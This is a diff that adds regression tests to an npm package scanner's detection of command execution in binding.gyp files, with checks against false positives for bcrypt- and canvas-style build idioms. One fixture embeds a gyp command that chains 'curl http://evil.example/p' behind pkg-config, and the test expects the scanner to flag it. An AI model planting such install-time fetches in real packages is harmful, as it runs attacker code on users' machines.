@@ -143,6 +143,56 @@ async function runPackageTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  await asyncTest('PACKAGE: build-tool with || fallback → NO gyp_command_exec (single-| FP regression)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-fallback', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "cflags": ["<!(pkg-config --cflags glib-2.0 || echo default)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A legit build-tool command with a ||/&& shell fallback must NOT fire (this was the single-| false positive)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: pkg-config || curl <payload> → gyp_command_exec (danger marker behind ||)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-evil-fallback', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!(pkg-config --cflags x || curl http://evil.example/p)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A network fetch (curl) chained behind a build tool via || must still fire (danger marker)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // FPR regressions from the real-package gate: the exact legit idioms bcrypt/canvas use via <!(...)
+  // must NOT fire — they carry no malice marker (a build-helper script == a payload, statically).
+  await asyncTest('PACKAGE: bcrypt-style node -p build query → NO gyp_command_exec (FPR gate)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-bcrypt-like', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "bcrypt_lib", "defines": ["NODE_MAJOR=<!(node -p process.versions.node)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A node -p build-value query (bcrypt idiom) must NOT fire — no malice marker');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: canvas-style node helper + pkg-config|sed → NO gyp_command_exec (FPR gate)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-canvas-like', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "canvas", "libraries": ["<!(node ./util/has_lib.js jpeg)"], "include_dirs": ["<!(pkg-config cairo --cflags-only-I | sed s/-I//g)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A local build-helper script (node ./util/has_lib.js) and pkg-config|sed (canvas idioms) must NOT fire');
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- No package.json ---
 
   await asyncTest('PACKAGE: Returns empty threats for missing package.json', async () => {
